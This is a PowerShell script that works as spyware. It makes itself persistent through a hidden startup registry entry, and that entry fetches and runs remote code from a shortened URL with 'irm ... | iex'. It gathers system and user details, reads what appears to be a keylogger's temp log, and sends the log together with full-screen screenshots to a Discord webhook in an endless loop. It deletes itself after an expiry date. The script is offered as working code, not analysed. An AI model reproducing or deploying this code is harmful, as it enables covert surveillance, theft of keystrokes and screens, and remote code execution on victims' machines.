# Ensure that the webhook URL is set directly from the command line
$webhookURL = $dc  # $webhookURL is the variable passed via the command line

# Define the path to the temp log file
$tempFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), 'temp_log.txt')

# Set the default expiry date to 30 days from today if no expiry date is passed
if (-not $expiryDateParam) {
    # Default expiry date is 30 days from today
    $expiryDate = (Get-Date).AddDays(30)
} else {
    # Parse the expiry date passed, assuming it is in 'MM/dd/yyyy' format or any valid date format
    try {
        $expiryDate = [datetime]::Parse($expiryDateParam)  # This will automatically parse common formats
    } catch {
        Write-Host "Invalid expiry date format. Please provide a valid date."
        exit
    }
}

# Convert the expiry date to 'yyyy-MM-dd' format
$expiryDateFormatted = $expiryDate.ToString('yyyy-MM-dd')

# Check if the script has expired
$currentDate = Get-Date
if ($currentDate -gt $expiryDate) {
    # If the script has expired, delete itself
    Write-Host "Script has expired. Deleting script file..."
    Remove-Item $MyInvocation.MyCommand.Path -Force
    exit
}

# Add this script to startup to ensure it runs every time the system boots
$regKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$scriptName = "Startup2"  # You can change this name if you like

# Command to execute in the startup registry
$regCommand = "powershell -NoP -Ep Bypass -W H -C `$dc='$webhookURL'; `$expiryDateParam='$expiryDateFormatted'; irm https://shorturl.at/R2sYz | iex"

# Check if the script is already added to startup to avoid duplicates
$existingEntry = Get-ItemProperty -Path $regKey -Name $scriptName -ErrorAction SilentlyContinue
if ($existingEntry) {
    Write-Host "Script is already added to startup." -ForegroundColor Yellow
} else {
    # Add the script to startup using the specified PowerShell command
    try {
        # Add the full PowerShell command to registry
        Set-ItemProperty -Path $regKey -Name $scriptName -Value $regCommand
        Write-Host "Script added to startup." -ForegroundColor Green
    }
    catch {
        Write-Host "Error adding script to startup:" -ForegroundColor Red
        Write-Host $_.Exception.Message
    }

    # Confirm that the entry has been added to the registry
    $confirmation = Get-ItemProperty -Path $regKey -Name $scriptName -ErrorAction SilentlyContinue
    if ($confirmation) {
        Write-Host "Script successfully added to startup." -ForegroundColor Green
    } else {
        Write-Host "Failed to add script to startup." -ForegroundColor Red
    }
}

# Get additional system info
$osInfo = Get-WmiObject -Class Win32_OperatingSystem
$cpuInfo = Get-WmiObject -Class Win32_Processor
$userInfo = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$hostname = $env:COMPUTERNAME

# Load necessary assemblies
Add-Type -AssemblyName "System.Windows.Forms"
Add-Type -AssemblyName "System.Drawing"

# Function to take screenshot and send it to Discord
function Send-ScreenshotToWebhook {
    # Accessing the VirtualScreen property (handles multi-monitor setups)
    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $Width = $Screen.Width
    $Height = $Screen.Height
    $Left = $Screen.Left
    $Top = $Screen.Top

    # Capture the screen
    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)

    # Save the screenshot to a temporary file
    $Filett = "$env:temp\SC.png"
    $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::Png)

    # Send the screenshot to Discord using curl
    try {
        # Send file using curl
        $curlCommand = "curl.exe -F ""file=@$Filett"" $webhookURL"
        Invoke-Expression $curlCommand

        Write-Host "Screenshot sent successfully!" -ForegroundColor Green
    }
    catch {
        Write-Host "Error while sending screenshot:" -ForegroundColor Red
        Write-Host $_.Exception.Message
    }

    # Clean up by deleting the screenshot file
    Remove-Item -Path $Filett -Force
}

# Start an infinite loop to check the file every 5 seconds
while ($true) {
    # Pause for 10 seconds before checking
    Start-Sleep -Seconds 10

    # Check if the temp log file exists
    if (Test-Path $tempFilePath) {
        # Read the content of the log file
        $logContent = Get-Content $tempFilePath -Raw

        # Check if the log file has content
        if ($logContent) {
            # Get the current timestamp
            $timestamp = Get-Date -Format 'dd-MM-yyyy HH:mm:ss'

            # Create the message to send (content only as a string)
            $message = "$timestamp - $logContent`n`nSystem Information:`nOS: $($osInfo.Caption)`nCPU: $($cpuInfo.Name)`nUser: $userInfo`nHostname: $hostname"

            # Debugging: Print the message to ensure it's properly formatted
            Write-Host "Message to send:" -ForegroundColor Cyan
            Write-Host $message

            # Try to send the message to the Discord webhook
            try {
                # Send the content as a plain string
                $jsonPayload = @{ content = $message } | ConvertTo-Json
                $response = Invoke-RestMethod -Uri $webhookURL -Method Post -ContentType 'application/json' -Body $jsonPayload
                Write-Host "Response from Discord:" -ForegroundColor Green
                Write-Host $response
            }
            catch {
                # Print detailed error message
                Write-Host "Error while sending message to webhook:" -ForegroundColor Red
                Write-Host $_.Exception.Message
            }

            # Send the screenshot to Discord webhook
            Send-ScreenshotToWebhook

            # Clear the content of the temp log file after sending the data
            Clear-Content $tempFilePath
        }
        else {
            Write-Host "No content in log file" -ForegroundColor Yellow
        }
    }
    else {
        Write-Host "Temp file not found at path: $tempFilePath" -ForegroundColor Yellow
    }
}
